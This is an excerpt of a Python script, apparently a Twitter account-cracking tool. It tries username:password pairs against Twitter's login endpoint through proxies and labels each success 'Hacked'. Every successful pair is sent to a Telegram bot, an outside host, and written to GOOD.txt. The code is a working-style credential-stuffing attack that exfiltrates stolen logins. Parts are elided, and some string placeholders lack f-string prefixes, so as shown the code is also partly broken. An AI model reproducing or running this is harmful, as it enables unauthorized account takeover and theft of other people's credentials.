...
os.system('clear')
print('\033[32m')
print(str(pyfiglet.figlet_format('sau'))+"")
...
def CHECK(user,pess):
	...
	try:
		...
		proxx={
			'http': 'http://{pxx}',
			'https': 'http://{pxx}'}
		req=requests.post('https://twitter.com/sessions',headers=head,data=data,proxies=proxx,timeout=3)
		if ("ct0") in req.cookies:
			print(colorama.Fore.GREEN+'--------------------------------')
			print('Hacked: [{user}:{pess}] ')
			YES="""
[✓] Hacked :
[✓] Email: {user}
[✓] Pass: {pess}
━━━━━━━━━━━━━"""
			...
			try:
				requests.post('https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={YES}')
			except:
				pass
			with open('GOOD.txt', 'a') as x:
				x.write('{user}:{pess}'+'\n')
		else:
			print(colorama.Fore.RED+"NOT HACKED : [{user}:{pess}]"+colorama.Fore.RESET)
